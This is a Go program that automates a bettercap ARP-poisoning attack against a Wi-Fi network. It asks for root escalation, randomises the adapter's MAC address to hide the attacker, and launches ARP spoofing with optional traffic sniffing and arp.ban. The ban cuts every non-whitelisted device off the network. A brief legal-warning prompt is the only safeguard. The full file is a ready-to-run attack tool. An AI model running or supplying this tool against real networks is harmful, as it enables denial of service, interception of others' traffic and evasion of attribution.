package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
)

const (
	ConfigFileName = "deny_all_wifi.conf"
	Version        = "1.0.0"
)

type Config struct {
	FullDuplex    string
	SniffTraffic  string
	SpoofInternal string
	Whitelist     string
}

func main() {
	clearScreen()
	printHeader()

	checkRoot()

	if !confirmLegal() {
		fmt.Println("Execution cancelled by user. Exiting.")
		os.Exit(0)
	}

	performDependencyCheck()

	iface := selectInterface()

	config := handleConfiguration()

	runAttack(iface, config)
}

func clearScreen() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func printHeader() {
	fmt.Println("---------------------------------------------------------")
	fmt.Println("         BETTERCAP ARP.BAN AUTO-EXECUTION MODULE         ")
	fmt.Println("---------------------------------------------------------")
	fmt.Println("")
}

func checkRoot() {
	if os.Geteuid() != 0 {
		fmt.Println("[-] This script requires root privileges to execute.")
		reader := bufio.NewReader(os.Stdin)

		for {
			fmt.Print("[?] Would you like to attempt to elevate privileges? (yes/no): ")
			input, _ := reader.ReadString('\n')
			input = strings.TrimSpace(strings.ToLower(input))

			if input == "yes" || input == "y" {
				break
			} else if input == "no" || input == "n" {
				fmt.Println("[-] Exiting: bettercap cannot run without root privileges.")
				os.Exit(1)
			}
		}

		elevate()
	}
	fmt.Println("[+] Root privileges confirmed.")
}

func elevate() {
	tools := []string{"sudo", "doas", "pkexec"}
	var privTool string
	for _, t := range tools {
		if _, err := exec.LookPath(t); err == nil {
			privTool = t
			break
		}
	}

	if privTool == "" {
		fmt.Println("[-] Could not automatically detect an escalation tool.")
		os.Exit(1)
	}

	fmt.Printf("[+] Attempting to escalate using '%s'...\n", privTool)
	
	executable, _ := os.Executable()
	cmd := exec.Command(privTool, append([]string{executable}, os.Args[1:]...)...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	err := cmd.Run()
	if err != nil {
		fmt.Printf("[-] Escalation failed: %v\n", err)
		os.Exit(1)
	}
	os.Exit(0)
}

func confirmLegal() bool {
	fmt.Println("\n----------------------- LEGAL WARNING -----------------------")
	fmt.Println("[!] ONLY run this script on networks you own or where you have")
	fmt.Println("    explicit permission from the owner to perform testing. [!]\n")
	fmt.Println("This script requires root privileges. It will block ALL")
	fmt.Println("devices on the network unless whitelisted via ARP poisoning.")
	fmt.Println("-------------------------------------------------------------")

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[?] Do you wish to proceed with the execution? (yes/no): ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))
	return input == "yes" || input == "y"
}

func performDependencyCheck() {
	fmt.Println("[+] Running dependency check...")
	missing := []string{}
	cmds := []string{"bettercap", "macchanger", "ip"}

	for _, c := range cmds {
		if _, err := exec.LookPath(c); err != nil {
			fmt.Printf("[-] '%s' is NOT installed.\n", c)
			missing = append(missing, c)
		} else {
			fmt.Printf("[+] '%s' is installed.\n", c)
		}
	}

	if len(missing) > 0 {
		fmt.Printf("\n[!] Missing: %v. Please install them using your package manager.\n", missing)
		os.Exit(1)
	}
}

type InterfaceInfo struct {
	Name    string
	IPv4    string
	IPv6    string
	Gateway string
}

func selectInterface() string {
	fmt.Println("\n[+] Scanning for Wi-Fi Interfaces...")
	files, _ := ioutil.ReadDir("/sys/class/net")
	var interfaces []InterfaceInfo

	fmt.Printf("%-4s | %-15s | %-15s | %-45s | %-15s\n", "Num", "Interface", "IPv4", "IPv6", "Gateway")
	fmt.Println("---- | --------------- | --------------- | --------------------------------------------- | ---------------")

	idx := 1
	for _, f := range files {
		name := f.Name()
		if _, err := os.Stat(filepath.Join("/sys/class/net", name, "wireless")); err == nil {
			info := InterfaceInfo{Name: name}
			info.IPv4 = getAddr(name, "-4")
			info.IPv6 = getAddr(name, "-6")
			info.Gateway = getGW(name)
			
			fmt.Printf("%-4d | %-15s | %-15s | %-45s | %-15s\n", idx, info.Name, info.IPv4, info.IPv6, info.Gateway)
			interfaces = append(interfaces, info)
			idx++
		}
	}

	if len(interfaces) == 0 {
		fmt.Println("[-] ERROR: No Wi-Fi interfaces detected.")
		os.Exit(1)
	}

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("\n[?] Select an interface by number (1-%d): ", len(interfaces))
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		
		var choice int
		fmt.Sscanf(input, "%d", &choice)

		if choice >= 1 && choice <= len(interfaces) {
			return interfaces[choice-1].Name
		}
		fmt.Println("[-] Invalid selection.")
	}
}

func getAddr(iface, family string) string {
	out, _ := exec.Command("ip", family, "addr", "show", "dev", iface).Output()
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, "inet") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				return strings.Split(parts[1], "/")[0]
			}
		}
	}
	return "N/A"
}

func getGW(iface string) string {
	out, _ := exec.Command("ip", "route", "show", "default", "dev", iface).Output()
	parts := strings.Fields(string(out))
	if len(parts) >= 3 && parts[0] == "default" {
		return parts[2]
	}
	return "N/A"
}

func getConfigPath() string {
	if len(os.Args) > 1 {
		argPath := os.Args[1]
		if info, err := os.Stat(argPath); err == nil && !info.IsDir() {
			return argPath
		}
	}
	home, _ := os.UserHomeDir()
	confDir := filepath.Join(home, "bettercap_conf")
	os.MkdirAll(confDir, 0755)
	return filepath.Join(confDir, ConfigFileName)
}

func handleConfiguration() Config {
	var conf Config
	path := getConfigPath()

	if _, err := os.Stat(path); os.IsNotExist(err) {
		fmt.Printf("[i] No configuration file found. Creating new config at: %s\n", path)
		conf = setupConfig(path)
	} else {
		conf = loadConfig(path)
	}

	for {
		fmt.Println("\n-----------------------------------------------------")
		fmt.Println("[i] CURRENT CONFIGURATION PROFILE")
		fmt.Println("-----------------------------------------------------")
		fmt.Printf("    %-16s : %s\n", "Config Path", path)
		fmt.Printf("    %-16s : %s\n", "Full Duplex", conf.FullDuplex)
		fmt.Printf("    %-16s : %s\n", "Sniff Traffic", conf.SniffTraffic)
		fmt.Printf("    %-16s : %s\n", "Spoof Internal", conf.SpoofInternal)
		fmt.Printf("    %-16s : %s\n", "Whitelist", conf.Whitelist)
		fmt.Println("-----------------------------------------------------")

		reader := bufio.NewReader(os.Stdin)
		fmt.Print("[?] Are these settings correct? (yes/no): ")
		ans, _ := reader.ReadString('\n')
		ans = strings.TrimSpace(strings.ToLower(ans))

		if ans == "yes" || ans == "y" {
			break
		} else {
			conf = setupConfig(path)
			fmt.Println("\n[+] Configuration updated.")
			fmt.Print("[?] Continue, Restart, or Exit? (c/r/e): ")
			choice, _ := reader.ReadString('\n')
			choice = strings.TrimSpace(strings.ToLower(choice))
			if choice == "r" {
				restartSelf()
			} else if choice == "e" {
				os.Exit(0)
			}
		}
	}
	return conf
}

func loadConfig(path string) Config {
	file, _ := os.Open(path)
	defer file.Close()
	scanner := bufio.NewScanner(file)
	conf := Config{}
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, "=")
		if len(parts) == 2 {
			val := strings.TrimSpace(parts[1])
			switch strings.TrimSpace(parts[0]) {
			case "fullduplex": conf.FullDuplex = val
			case "sniff_traffic": conf.SniffTraffic = val
			case "spoof_internal": conf.SpoofInternal = val
			case "whitelist": conf.Whitelist = val
			}
		}
	}
	return conf
}

func setupConfig(path string) Config {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\n[?] Use 'default' or 'interactive' config? (d/i): ")
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	var c Config
	if mode == "interactive" || mode == "i" {
		c.FullDuplex = askYesNo("Enable Full Duplex mode?")
		c.SniffTraffic = askYesNo("Enable Traffic Sniffing?")
		c.SpoofInternal = askYesNo("Enable Internal Spoofing?")
		fmt.Print("[?] Enter Whitelist (comma separated) or press Enter for none: ")
		wl, _ := reader.ReadString('\n')
		c.Whitelist = strings.TrimSpace(wl)
		if c.Whitelist == "" { c.Whitelist = "no" }
	} else {
		c = Config{"yes", "yes", "yes", "no"}
	}

	saveConfig(path, c)
	return c
}

func askYesNo(prompt string) string {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("[?] %s (y/n): ", prompt)
		ans, _ := reader.ReadString('\n')
		ans = strings.TrimSpace(strings.ToLower(ans))
		if ans == "y" || ans == "yes" { return "yes" }
		if ans == "n" || ans == "no" { return "no" }
	}
}

func saveConfig(path string, c Config) {
	content := fmt.Sprintf("fullduplex=%s\nsniff_traffic=%s\nspoof_internal=%s\nwhitelist=%s\n", 
		c.FullDuplex, c.SniffTraffic, c.SpoofInternal, c.Whitelist)
	ioutil.WriteFile(path, []byte(content), 0644)
}

func restartSelf() {
	argv0, _ := os.Executable()
	err := syscall.Exec(argv0, os.Args, os.Environ())
	if err != nil {
		panic(err)
	}
}

func runAttack(iface string, conf Config) {
	fmt.Println("\n[+] Randomizing MAC Address for OPSEC and displaying details...")
	fmt.Println("[+] Taking interface down...")
	if err := exec.Command("ip", "link", "set", "dev", iface, "down").Run(); err != nil {
		fmt.Printf("[-] Error taking interface down: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Changing MAC address with macchanger...")
	macchangerCmd := exec.Command("macchanger", "-r", "-b", iface)
	macchangerOutput, err := macchangerCmd.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] Error running macchanger: %v\nOutput:\n%s\n", err, macchangerOutput)
		os.Exit(1)
	}

	macchangerLines := strings.Split(string(macchangerOutput), "\n")
	fmt.Println("-----------------------------------------------------")
	fmt.Println("[i] MAC Address Change Details:")
	for _, line := range macchangerLines {
		if strings.Contains(line, "Current MAC:") || strings.Contains(line, "Permanent MAC:") || strings.Contains(line, "New MAC:") {
			fmt.Printf("    %s\n", strings.TrimSpace(line))
		}
	}
	fmt.Println("-----------------------------------------------------")

	fmt.Println("[+] Bringing interface up...")
	if err := exec.Command("ip", "link", "set", "dev", iface, "up").Run(); err != nil {
		fmt.Printf("[-] Error bringing interface up: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[+] Interface is now up with new MAC address.")
	fmt.Println("[+] Your old, new, and real permanent MAC address for your Wi-Fi Adaptor are all Displayed Above by macchanger when your MAC Address was changed.")
	fmt.Println("[+] MAC Address has been set to a Realistically Random MAC Address.\n")

	seq := "net.probe on; "
	if conf.SpoofInternal == "yes" { seq += "set arp.spoof.internal true; " }
	if conf.FullDuplex == "yes" { seq += "set arp.spoof.fullduplex true; " }
	if conf.SniffTraffic == "yes" { seq += "net.sniff on; " }
	if conf.Whitelist != "no" { seq += fmt.Sprintf("set arp.spoof.whitelist %s; ", conf.Whitelist) }
	seq += "arp.ban on;"

	fmt.Println("-----------------------------------------------------")
	fmt.Printf("[+] Interface: %s\n", iface)
	fmt.Printf("[+] Sequence : %s\n", seq)
	fmt.Println("-----------------------------------------------------")

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[?] Launch Bettercap now? (yes/no): ")
	confirm, _ := reader.ReadString('\n')
	if !strings.HasPrefix(strings.ToLower(confirm), "y") {
		fmt.Println("Aborted.")
		return
	}

	cmd := exec.Command("bettercap", "-iface", iface, "-eval", seq)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	fmt.Println("[!] Press Ctrl+C to stop the attack.")
	if err := cmd.Run(); err != nil {
		fmt.Printf("\n[-] Bettercap exited with error: %v\n", err)
	}
	fmt.Println("\n[+] Attack stopped. Network returning to normal.")
}